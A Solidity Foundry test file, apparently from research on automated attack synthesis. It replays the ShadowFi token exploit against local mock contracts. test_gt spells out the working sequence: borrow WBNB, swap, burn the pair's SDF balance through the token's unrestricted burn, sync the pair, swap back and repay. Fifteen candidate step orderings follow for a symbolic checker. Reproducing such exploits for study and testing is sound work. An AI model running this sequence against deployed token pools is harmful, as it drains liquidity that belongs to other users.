// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./ShadowFi.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract ShadowFiTest is Test, BlockLoader {
    ShadowFi sdf;
    WBNB wbnb;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address sdfAddr;
    address wbnbAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1662087759;
    uint112 reserve0pair = 10354946297404462;
    uint112 reserve1pair = 1078615699417903036883;
    uint32 blockTimestampLastpair = 1662087399;
    uint256 kLastpair = 11168582114763855959993144120569517654;
    uint256 price0CumulativeLastpair =
        157449582249269446379575224577723805796713567;
    uint256 price1CumulativeLastpair = 11000324645391158414408753680638581;
    uint256 totalSupplysdf = 99217139151583758;
    uint256 balanceOfsdfpair = 10354946297404462;
    uint256 balanceOfsdfattacker = 0;
    uint256 balanceOfsdf = 0;
    uint256 totalSupplywbnb = 4333032609170794678942729;
    uint256 balanceOfwbnbpair = 1078615699417903036883;
    uint256 balanceOfwbnbattacker = 2000000000000000000;
    uint256 balanceOfwbnb = 29524049518234847547;

    function setUp() public {
        owner = address(this);
        sdf = new ShadowFi(1662075000);
        sdfAddr = address(sdf);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        pair = new UniswapV2Pair(
            address(sdf),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        sdf.afterDeploy(address(router), address(pair));
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        sdf.transfer(address(pair), balanceOfsdfpair);
        wbnb.transfer(address(attackContract), balanceOfwbnbattacker);
        wbnb.approve(attacker, UINT256_MAX);
        sdf.approve(attacker, UINT256_MAX);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Sdf Balances: ");
        queryERC20BalanceDecimals(address(wbnb), address(sdf), wbnb.decimals());
        queryERC20BalanceDecimals(address(sdf), address(sdf), sdf.decimals());
        emit log_string("");
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(sdf), address(wbnb), sdf.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(sdf), address(pair), sdf.decimals());
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attackContract),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(sdf),
            address(attackContract),
            sdf.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_wbnb(uint256 amount) internal {
        wbnb.transferFrom(owner, attacker, amount);
    }

    function payback_wbnb(uint256 amount) internal {
        wbnb.transfer(owner, amount);
    }

    function borrow_sdf(uint256 amount) internal {
        sdf.transferFrom(owner, attacker, amount);
    }

    function payback_sdf(uint256 amount) internal {
        sdf.transfer(owner, amount);
    }

    function swap_pair_sdf_wbnb(uint256 amount) internal {
        sdf.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(sdf);
        path[1] = address(wbnb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_wbnb_sdf(uint256 amount) internal {
        wbnb.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(sdf);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function burn_pair_sdf(uint256 amount) internal {
        sdf.burn(address(pair), amount);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        borrow_wbnb(1e16);
        printBalance("After step0 ");
        swap_pair_wbnb_sdf(1e16);
        printBalance("After step1 ");
        burn_pair_sdf(sdf.balanceOf(address(pair)) - 1);
        printBalance("After step2 ");
        sync_pair();
        printBalance("After step3 ");
        swap_pair_sdf_wbnb(sdf.balanceOf(attacker));
        printBalance("After step4 ");
        payback_wbnb(1.003e16);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        sync_pair();
        swap_pair_sdf_wbnb(amt3);
        payback_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        swap_pair_sdf_wbnb(amt3);
        payback_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        swap_pair_sdf_wbnb(amt3);
        swap_pair_sdf_wbnb(amt4);
        payback_wbnb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        sync_pair();
        swap_pair_sdf_wbnb(amt3);
        payback_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        swap_pair_sdf_wbnb(amt4);
        payback_wbnb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        sync_pair();
        swap_pair_sdf_wbnb(amt3);
        swap_pair_sdf_wbnb(amt4);
        payback_wbnb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        swap_pair_sdf_wbnb(amt4);
        swap_pair_sdf_wbnb(amt5);
        payback_wbnb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        sync_pair();
        swap_pair_sdf_wbnb(amt4);
        payback_wbnb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        burn_pair_sdf(amt4);
        swap_pair_sdf_wbnb(amt5);
        payback_wbnb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        sync_pair();
        swap_pair_sdf_wbnb(amt4);
        swap_pair_sdf_wbnb(amt5);
        payback_wbnb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        burn_pair_sdf(amt4);
        swap_pair_sdf_wbnb(amt5);
        swap_pair_sdf_wbnb(amt6);
        payback_wbnb(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        burn_pair_sdf(amt4);
        sync_pair();
        swap_pair_sdf_wbnb(amt5);
        payback_wbnb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        burn_pair_sdf(amt4);
        burn_pair_sdf(amt5);
        swap_pair_sdf_wbnb(amt6);
        payback_wbnb(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        burn_pair_sdf(amt4);
        sync_pair();
        swap_pair_sdf_wbnb(amt5);
        swap_pair_sdf_wbnb(amt6);
        payback_wbnb(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt8 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        burn_pair_sdf(amt4);
        burn_pair_sdf(amt5);
        swap_pair_sdf_wbnb(amt6);
        swap_pair_sdf_wbnb(amt7);
        payback_wbnb(amt8);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        burn_pair_sdf(amt4);
        burn_pair_sdf(amt5);
        sync_pair();
        swap_pair_sdf_wbnb(amt6);
        payback_wbnb(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt8 == (amt0 * 1003) / 1000);
        vm.warp(blockTimestamp);
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        burn_pair_sdf(amt3);
        burn_pair_sdf(amt4);
        burn_pair_sdf(amt5);
        sync_pair();
        swap_pair_sdf_wbnb(amt6);
        swap_pair_sdf_wbnb(amt7);
        payback_wbnb(amt8);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
